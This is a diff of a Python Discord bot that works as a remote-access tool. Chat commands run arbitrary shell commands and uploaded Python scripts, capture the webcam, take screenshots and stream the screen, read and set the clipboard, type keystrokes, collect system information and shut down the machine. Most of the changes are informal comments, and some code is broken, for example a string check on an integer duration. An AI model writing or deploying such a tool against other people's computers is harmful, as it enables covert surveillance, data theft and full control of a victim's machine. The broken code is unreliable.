@@ -1,5 +1,4 @@
 from discord.ext import commands
-from discord import app_commands
 from PIL import ImageGrab
 import tkinter as tk
 import subprocess 
@@ -17,20 +16,23 @@ import platform
 import pyttsx3
 import cv2
 import pyperclip
+# download all the librarys needed
 
 # Setup:
 intents = discord.Intents.all()
 intents.message_content = True
-intents.presences = False
+intents.presences = False 
 intents.typing = False
+# these where all needed for some commands to work
 
-engine = pyttsx3.init()
-bot = commands.Bot(command_prefix='!', intents=intents)
+engine = pyttsx3.init() # <-- the TTS engine
+bot = commands.Bot(command_prefix='!', intents=intents) # the sign to see if the message is a command
 
 # UX:
 @bot.command()
 async def commands(ctx):
-    print("Someone saw the commands.")
+    print("Someone saw the commands.") # print in the terminal to see if it worked
+    # we say the commands to make the UX better
     await ctx.send("""
 > ## **Commands:**
 > ### UX:
@@ -58,12 +60,13 @@ async def commands(ctx):
 
 @bot.command()
 async def deepdive(ctx, command=None):
-    if command is None:
+    if command is None: # for dumb users
         await ctx.send("You need to say what command you want a deep dive on.")
     else:
         print("Someone wants a deepdive on:", command)
   
-        if command == "commands":
+        if command == "commands": 
+            # this i have tried to have in like a txt or json but sometimes the simpeler the better 
             await ctx.send("""
 --------------------------------------------------------------------
 ## ! COMMANDS
@@ -439,7 +442,7 @@ async def cmd(ctx, *, command):
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
+            stderr=subprocess.PIPE, # shell things
             text=False
         )
         
@@ -453,7 +456,7 @@ async def cmd(ctx, *, command):
                     await ctx.send(f"Output:\n```\n{output}\n```")
                 else:
                     with open('cmd_output.txt', 'w') as file:
-                        file.write(output)
+                        file.write(output)        # this is all enoying error handeling
                     with open('cmd_output.txt', 'rb') as file:
                         await ctx.send("Command output is too long to display. Here's a text file:", file=discord.File(file, 'cmd_output.txt'))
             else:
@@ -465,7 +468,7 @@ async def cmd(ctx, *, command):
                 if len(error) <= 2000:
                     print(f"Error:\n```\n{error}\n```")
                     await ctx.send(f"Error:\n```\n{error}\n```")
-                else:
+                else:                                                   #send the output (as txt if needed)
                     with open('cmd_error.txt', 'w') as file:
                         file.write(error)
                     with open('cmd_error.txt', 'rb') as file:
@@ -479,18 +482,28 @@ async def cmd(ctx, *, command):
 
 @bot.command()
 async def write(ctx, *, text=None):
-    if text is None:
+    if text is None: # just in case
         await ctx.send("You need to say what you want to be typed out.")
     print("Typing out: ", text)
     await ctx.send(f'Typing out: {text}')
-    keyboard.write(text, delay=0.05)
+    # lets the keyboard lib type it out
+    keyboard.write(text, delay=0.05) # dosnt work without the delay 4 some resson
 
 @bot.command()
 async def openlink(ctx, url=None):
     if url is None:
         await ctx.send("You need to have a link to open.")
     print("Opend link: ", url)
+    # make the webbrowser lib do all the work
+    # this code is basicly just the !write code 
     webbrowser.open(url)
+
+@bot.command()
+async def mp3(ctx):
+    if len(ctx.message.attachments) == 0:
+        await ctx.send("Please attach a MP3 file.")
+        return
+    # WIP
 
 @bot.command()
 async def setclip(ctx, *, clip=None):
@@ -498,7 +511,8 @@ async def setclip(ctx, *, clip=None):
         await ctx.send("You need to say what you want to set the clipboard to.")
     else:
         print("Set the cliboard to: ", clip)
-        await ctx.send("Set the cliboard to: " + clip)
+        await ctx.send("Set the cliboard to: " + clip) 
+        # makes the lib set the clipboard
         pyperclip.copy(clip)
 
 @bot.command()
@@ -508,19 +522,22 @@ async def speak(ctx, *, message=None):
     else:
         print("Saying: ", message)
         await ctx.send("Saying: " + message)
-        engine.say(message)
-        engine.runAndWait()
+        engine.say(message) # load it in
+        engine.runAndWait() # say it
 
 @bot.command()
 async def popup(ctx, text_main="Window", *, text_sub="Hello there!"):
+                              # set it as "Window" and "Hello there!" to not bother with error handeling
     print("Creating a window with the main title: ", text_main, " and the sub text being: ", text_sub)
     await ctx.send("Creating a window with the main title: " + text_main + ", and the sub text being: " + text_sub)
     
+    # creak the window:
     window = tk.Tk()
     window.title(text_main)
     label = tk.Label(window, text=text_sub)
     window.geometry("400x70")
 
+    # pack and run the window:
     label.pack()
     window.mainloop()
 
@@ -529,18 +546,17 @@ async def runscript(ctx):
     if len(ctx.message.attachments) == 0:
         await ctx.send("Please attach a Python script file.")
         return
-
+                                                                        # ERROR HANDELING...
     attachment = ctx.message.attachments[0]
     if not attachment.filename.endswith('.py'):
         await ctx.send("Please attach a valid Python script file.")
         return
-
+                                                                        # ERROR HANDELING...
     try:
         temp_dir = tempfile.mkdtemp()
         temp_file_path = os.path.join(temp_dir, attachment.filename)
         await attachment.save(temp_file_path)
-
-        # Check if the file contains null bytes
+                                                                        # ERROR HANDELING...
         with open(temp_file_path, 'rb') as file:
             if b'\x00' in file.read():
                 await ctx.send("The Python script file contains null bytes and cannot be executed.")
@@ -549,16 +565,16 @@ async def runscript(ctx):
         result = subprocess.run(["python", temp_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=30)
         output = result.stdout or result.stderr
     except subprocess.TimeoutExpired:
-        output = "Script execution timed out."
+        output = "Script execution timed out." # make it not run forever
     except Exception as e:
         output = str(e)
     finally:
         os.remove(temp_file_path)
         shutil.rmtree(temp_dir)
     
-    if len(output) <= 2000:
+    if len(output) <= 2000: # make it convert the output to txt if needed
         print("Ran python file")
-        await ctx.send(f"```\n{output}\n```")
+        await ctx.send(f"```\n{output}\n```")       
     else:
         with open('python_output.txt', 'w') as file:
             file.write(f"```\n{output}\n```")
@@ -570,20 +586,18 @@ async def runscript(ctx):
 @bot.command()
 async def connected(ctx):
     username = getpass.getuser()
-    print("User: ", username, "connected")
+    print("User: ", username, "connected")     # the idee is to if multipul users are conected they all will print their users usernames
     await ctx.send(username)
 
 @bot.command()
 async def systeminfo(ctx):
-    username = getpass.getuser()
-
     os_name = platform.system()
     os_version = platform.version()
     os_release = platform.release()
 
     cpu_name = platform.processor()
     cpu_cores = psutil.cpu_count(logical=False)
-    cpu_threads = psutil.cpu_count(logical=True)
+    cpu_threads = psutil.cpu_count(logical=True)            # get the info
 
     memory = psutil.virtual_memory()
     total_memory = memory.total
@@ -595,34 +609,28 @@ async def systeminfo(ctx):
     network_interfaces = psutil.net_if_addrs()
 
     operating_system_info = (
-        "Operating System: {}\n"
-        "OS Version: {}\n"
-        "OS Release: {}\n\n"
-        "CPU: {}\n"
-        "CPU Cores: {}\n"
-        "CPU Threads: {}\n\n"
-        "Total Memory: {} bytes\n"
-        "Available Memory: {} bytes\n\n"
-        "Disk Partitions: {}\n"
-        "Disk Usage: {}\n\n"
-        "Network Interfaces: {}\n"
-    ).format(
-        os_name, os_version, os_release,
-        cpu_name, cpu_cores, cpu_threads,
-        total_memory, available_memory,
-        disk_partitions, disk_usage,
-        network_interfaces
+        f"Operating System: {os_name}\n"
+        f"OS Version: {os_version}\n"
+        f"OS Release: {os_release}\n\n"
+        f"CPU: {cpu_name}\n"
+        f"CPU Cores: {cpu_cores}\n"                 # set it all in a variabel 
+        f"CPU Threads: {cpu_threads}\n\n"
+        f"Total Memory: {total_memory} bytes\n"
+        f"Available Memory: {available_memory} bytes\n\n"
+        f"Disk Partitions: {disk_partitions}\n"
+        f"Disk Usage: {disk_usage}\n\n"
+        f"Network Interfaces: {network_interfaces}\n"
     )
 
     if len(operating_system_info) <= 2000:
-        print("Printed system info: ", username)
+        print("Printed system info")
         await ctx.send(operating_system_info)
     else:
-        with open('system_info.txt', 'w') as file:
-            file.write(operating_system_info)
-        with open('system_info.txt', 'rb') as file:
-            print("Printed system info: ", username)
-            await ctx.send("System information is too long to display. Here's a text file:", file=discord.File(file, 'system_info.txt'))
+        file_obj = io.StringIO(operating_system_info)
+        
+        print("Printed system info")
+        # now just compile it all:
+        await ctx.send("System information is too long to display. Here's a text file:", file=discord.File(file_obj, 'system_info.txt'))
 
 @bot.command()
 async def webcam(ctx):
@@ -632,7 +640,7 @@ async def webcam(ctx):
     ret, frame = cap.read()
 
     _, img_bytes = cv2.imencode('.jpg', frame)
-    img_data = img_bytes.tobytes()
+    img_data = img_bytes.tobytes()                  # shit to make it take and send the webcam pic
     
     print("Sent webcam pic.")
     await ctx.send(file=discord.File(fp=io.BytesIO(img_data), filename='webcam.jpg'))
@@ -642,20 +650,22 @@ async def webcam(ctx):
 
 @bot.command()
 async def screenshot(ctx):
+    # screenschot
     screenshot = ImageGrab.grab()
 
     buffer = io.BytesIO()
-    screenshot.save(buffer, format='PNG')
+    screenshot.save(buffer, format='PNG')     # compile
     buffer.seek(0)
 
     print("Screenshot taken")
+    # send
     await ctx.send(file=discord.File(buffer, filename='screenshot.png'))
 
 @bot.command()
 async def screenshare(ctx, how_long: int = 15):
     print("Screensharing for: ", how_long)
-    if how_long <= 0:
-        await ctx.send("Invalid duration. Please provide a positive duration.")
+    if how_long <= 0 or "." in how_long: # making sure you dont ask for a negative value and its a even numb
+        await ctx.send("Invalid duration. Please provide a positive, even duration.")
         return
 
     for _ in range(how_long):
@@ -663,39 +673,39 @@ async def screenshare(ctx, how_long: int = 15):
 
         buffer = io.BytesIO()
         screenshot.save(buffer, format='PNG')
-        buffer.seek(0)
+        buffer.seek(0)                                            # do like when screenshoting
         
         async for message in ctx.history(limit=1):
             if message.author == bot.user:
                 try:
                     await message.delete()
-                except discord.NotFound:
+                except discord.NotFound:                          # deleat previos screenshot to not flood the chat
                     pass
 
-        await ctx.send(file=discord.File(buffer, filename='screenshot.png'))
+        await ctx.send(file=discord.File(buffer, filename='screenshot.png')) # send it
 
 @bot.command()
 async def getclip(ctx):
     clipboard_text = pyperclip.paste()
-    print("Clipboard text: ", clipboard_text)
+    print("Clipboard text: ", clipboard_text)           # get the clipboard and send it
     await ctx.send(clipboard_text)
 
 # Terminate:
 @bot.command()
 async def shutdown(ctx):
     print("Shutting down...")
-    await ctx.send("Shutting down...")
+    await ctx.send("Shutting down...")          # shut down the PC using OS
     os.system("shutdown /s /t 1")
 
 @bot.command()
 async def restart(ctx):
     print("Restarting...")
-    await ctx.send("Restarting...")
+    await ctx.send("Restarting...")             # restart the PC using OS
     os.system("shutdown /r /t 1")
 
 # on ready:
 @bot.event
 async def on_ready():
-    print(f'Logged in as {bot.user.name}')
+    print(f'Logged in as {bot.user.name}')          # so you dont log in to the wrong bot
 
 bot.run('YOUR_BOT_TOKEN')
